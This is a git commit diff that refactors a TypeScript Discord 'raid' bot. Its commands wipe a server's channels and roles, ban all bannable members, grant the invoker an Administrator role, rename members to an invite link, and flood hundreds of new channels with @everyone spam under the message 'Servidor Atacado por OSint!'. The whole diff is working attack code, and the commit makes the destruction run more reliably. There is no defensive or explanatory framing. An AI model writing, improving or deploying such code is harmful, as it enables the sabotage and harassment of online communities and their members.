b8c18ac25bc5477b51b114525a18a8e463cd6dcf
osint <osintaxis@gmail.com>
2024-08-03 20:03:42 -0500

    optimizing

--- src/config/raid.config.ts
+++ src/config/raid.config.ts
@@ -1,12 +1,12 @@
 import { RaidData } from './raid.interface';
-
+import "dotenv/config";
 export const raidData: RaidData = {
-  icon: 'https://pbs.twimg.com/media/Ev-eBa-WgAY9qer.jpg',
+  icon: 'https://images-ext-1.discordapp.net/external/MNhTLpAjfnYRn-9ccT7G9xHytta5uOOt_FHpdQqiWfo/%3Fsize%3D2048/https/cdn.discordapp.com/icons/1093539713123623033/533cf23881e06906efe831be83573490.png?format=webp&quality=lossless&width=662&height=662',
   message: 'Servidor Atacado por OSint!',
-  invite: 'https://discord.gg/keB6NnWE5H',
-  name: 'osint',
-  nuke_name: 'osint',
-  raid_channel: 'osint',
+  invite: 'https://discord.gg/PxFDykkt',
+  name: '/shabz',
+  nuke_name: '/shabz',
+  raid_channel: '/shabz',
 };
 
 export const colors = {
@@ -19,6 +19,8 @@ export const colors = {
   white: '\x1b[37m',
 };
 
-export const admin: string = '870684044441055264';
+export const admin: string = '817516787074596884';
 export const reset: string = '\x1b[0m';
 export const prefix: string = '+';
+
+export const TOKEN: string = process.env.TOKEN as string;
--- src/index.ts
+++ src/index.ts
@@ -5,120 +5,138 @@ import {
   Events,
   ActivityType,
   ChannelType,
-} from "discord.js";
-import { raidData, colors, reset, admin, prefix } from "./config/raid.config";
-import express from "express";
+  GatewayIntentBits,
+} from 'discord.js';
+import {
+  raidData,
+  colors,
+  reset,
+  admin,
+  prefix,
+  TOKEN,
+} from './config/raid.config';
+import express from 'express';
 
-//Express Server
+// Express Server
 const app = express();
-app.get("/", (req: any, res: any) => {
-  res.send("Quién chucha eres tú huevon.");
+app.get('/', (req: any, res: any) => {
+  res.send('Quién chucha eres tú huevon.');
 });
-app.listen(process.env.PORT || 3000);
+app.listen(process.env.PORT || 3000, () => {
+  console.log('Express server listening.');
+});
 
-//Client Init
-const client: Client = new Client({ intents: 3276799 });
+// Client Init
+const client = new Client({
+  intents: [
+    GatewayIntentBits.Guilds,
+    GatewayIntentBits.GuildMessages,
+    GatewayIntentBits.MessageContent,
+    GatewayIntentBits.MessageContent,
+    GatewayIntentBits.GuildPresences,
+    GatewayIntentBits.GuildMembers,
+  ],
+});
 
-//Ready!
-client.on(Events.ClientReady, () => {
+// Ready!
+client.once(Events.ClientReady, () => {
   if (!client.user) return;
-  console.log(client.user.username, " is ready");
+  console.log(`${client.user.username} is ready`);
   console.log(
     `https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=1642824461566&scope=bot%20application`
   );
   client.user.setPresence({
-    status: "dnd",
+    status: 'dnd',
     activities: [{ name: prefix, type: ActivityType.Competing }],
   });
 });
 
-//Commands
+// Commands
 client.on(Events.MessageCreate, async (message: Message) => {
   if (message.channel.type === ChannelType.DM) return;
   if (message.author.bot) return;
 
-  let Guild = message.guild;
+  const Guild = message.guild;
 
   const funcs = {
-    wrong: (params: string) => message.channel.send({ content: params }),
+    wrong: (params: string) => message.channel.send(params),
     sleep: (ms: number) => new Promise((resolve) => setTimeout(resolve, ms)),
   };
+
   if (message.content === `${prefix}help`) {
-    const cmds = ["kill", "banall", "admin", "emoji", "massnick"];
-    const embed: EmbedBuilder = new EmbedBuilder()
-      .setTitle("Hamlet v1 | Prefix: `+`")
+    const cmds = ['kill', 'banall', 'admin', 'emoji', 'massnick'];
+    const embed = new EmbedBuilder()
+      .setTitle('Hamlet v1 | Prefix: `+`')
       .setDescription(
-        `Hola **${message.author.username}**! Mi nombre es Hamlet, el bot de *NationSquad*\n\n**Actualmente, mis comandos son:**\n` +
-          cmds.map((c) => "`" + c + "`").join("\n") +
-          "\nTen un buen día!"
+        `Hola **${message.author.username}**! Mi nombre es Hamlet, el bot de */shabz*\n\n**Actualmente, mis comandos son:**\n` +
+          cmds.map((c) => '`' + c + '`').join('\n') +
+          '\nTen un buen día!'
       )
-      .setThumbnail("https://media.tenor.com/fy5Mwh-q5ZUAAAAC/hamtaro.gif");
+      .setThumbnail('https://media.tenor.com/fy5Mwh-q5ZUAAAAC/hamtaro.gif');
     message.channel.send({ embeds: [embed] });
   }
 
   if (message.content === `${prefix}massnick`) {
     Guild?.members.cache.forEach((m) => {
       m.setNickname(raidData.invite).catch((e) =>
-        console.log(colors.red, "Changing nicknames", reset)
+        console.log(colors.red, 'Changing nicknames', reset, e)
       );
     });
   }
 
   if (message.content === `${prefix}admin`) {
     const role = await Guild?.roles.create({
-      name: "pwns",
-      permissions: ["Administrator"],
+      name: 'pwns',
+      permissions: ['Administrator'],
     });
-    message.member?.roles.add(`${role?.id}`);
+    if (message.member && role) {
+      message.member.roles.add(role);
+    }
   }
 
   if (message.content === `${prefix}banall`) {
     Guild?.members.cache.forEach(async (m) => {
-      if (m.bannable)
-        m.ban().catch((e) =>
-          console.log(colors.blue, "Banning users: ", reset, e)
-        );
+      if (m.bannable) {
+        await m
+          .ban()
+          .catch((e) => console.log(colors.blue, 'Banning users: ', reset, e));
+      }
     });
   }
 
   if (message.content === `${prefix}nuke`) {
     const deleteServerData = async () => {
       Guild?.channels.cache.forEach((c) => {
-        c.delete()
-          .then((channel) => Guild?.channels.cache.delete(channel.id))
-          .catch((e) =>
-            console.log(colors.cyan, "Deleting channels", reset, e.message)
-          );
+        c.delete().catch((e) =>
+          console.log(colors.cyan, 'Deleting channels', reset, e.message)
+        );
       });
     };
 
-    deleteServerData().then(() =>
-      message.guild?.channels
-        .create({ name: raidData.nuke_name, type: ChannelType.GuildText })
-        .then((c) => c.send(`${raidData.invite} ||@everyone||`))
-    );
+    await deleteServerData();
+    await Guild?.channels
+      .create({
+        name: raidData.nuke_name,
+        type: ChannelType.GuildText,
+      })
+      .then((c) => c.send(`${raidData.invite} ||@everyone||`));
   }
 
-  //Automatic
   if (message.content === `${prefix}kill`) {
     try {
       const deleteChannels = async () => {
         Guild?.channels.cache.forEach((c) => {
-          c.delete()
-            .then((channel) => Guild?.channels.cache.delete(channel.id))
-            .catch((e) =>
-              console.log(colors.cyan, "Deleting channels", reset, e.message)
-            );
+          c.delete().catch((e) =>
+            console.log(colors.cyan, 'Deleting channels', reset, e.message)
+          );
         });
       };
 
       const deleteRoles = async () => {
         Guild?.roles.cache.forEach((r) => {
-          r.delete()
-            .then((role) => Guild?.roles.cache.delete(role.id))
-            .catch((e) =>
-              console.log(colors.yellow, "Deleting roles:", reset, e.message)
-            );
+          r.delete().catch((e) =>
+            console.log(colors.yellow, 'Deleting roles:', reset, e.message)
+          );
         });
       };
 
@@ -126,14 +144,14 @@ client.on(Events.MessageCreate, async (message: Message) => {
         for (let i = 0; i <= 458; i++) {
           if (!Guild) return;
 
-          const ch = await Guild?.channels.create({
+          const ch = await Guild.channels.create({
             name: raidData.raid_channel,
             topic: raidData.invite,
             type: ChannelType.GuildText,
             permissionOverwrites: [
               {
-                id: Guild?.id,
-                allow: ["ViewChannel"],
+                id: Guild.id,
+                allow: ['ViewChannel'],
               },
             ],
           });
@@ -141,61 +159,59 @@ client.on(Events.MessageCreate, async (message: Message) => {
           const sendMessages = async (ms?: number) => {
             for (let x = 0; x <= 4; x++) {
               if (!ch) continue;
-              ch.send(`@everyone ${raidData.message}`).catch((e) => {
-                Guild?.channels.delete(ch.id);
+              await ch.send(`@everyone ${raidData.message}`).catch((e) => {
+                Guild?.channels.cache.delete(ch.id);
                 console.log(
                   colors.magenta,
-                  "Sending messages:",
+                  'Sending messages:',
                   reset,
                   e.message
                 );
               });
             }
             if (ms) await funcs.sleep(ms * 1000);
-            return;
           };
-          const createRoles = async () => {
-            for (let x = 0; x <= 249; x++) {
-              Guild?.roles
-                .create({
-                  name: raidData.nuke_name,
-                })
-                .catch((e) =>
-                  console.log(colors.yellow, "Creating roles", reset, e.message)
-                );
-            }
-          };
-          Promise.all([ch, createRoles]).then(async () => {
-            await sendMessages(5);
-            await sendMessages(10);
-            await sendMessages(20);
-            await sendMessages();
-          });
+          await sendMessages(5);
+          await sendMessages(10);
+          await sendMessages(20);
+          await sendMessages();
         }
       };
+      const createRoles = async () => {
+        for (let x = 0; x <= 249; x++) {
+          await Guild?.roles
+            .create({
+              name: raidData.nuke_name,
+            })
+            .catch((e) =>
+              console.log(colors.yellow, 'Creating roles', reset, e.message)
+            );
+        }
+      };
+
       await Guild?.setName(raidData.name);
       await Guild?.setIcon(raidData.icon);
       await deleteRoles();
       await deleteChannels();
       await createChannels();
+      await createRoles();
     } catch (e) {
-      console.log(colors.red, "Unexpected:", reset, e);
+      console.log(colors.red, 'Unexpected:', reset, e);
     }
   }
 
-  //Server map
   if (message.content === `${prefix}servers`) {
     if (message.author.id !== admin) return;
-    let guilds = client.guilds.cache.sort((a, b) => (a > b ? -1 : 1));
+    const guilds = client.guilds.cache.sort((a, b) => (a > b ? -1 : 1));
     guilds.forEach((g) => {
       try {
-        if (g.id === "897986461222207589") return;
-        message.channel.send(" | " + g.name + " | " + g.memberCount);
+        if (g.id === '897986461222207589') return;
+        message.channel.send(` | ${g.name} | ${g.memberCount}`);
       } catch (e) {
-        message.channel.send(g.name + " | " + g.id);
+        message.channel.send(`${g.name} | ${g.id}`);
       }
     });
   }
 });
 
-client.login(process.env.TOKEN);
+client.login(TOKEN);
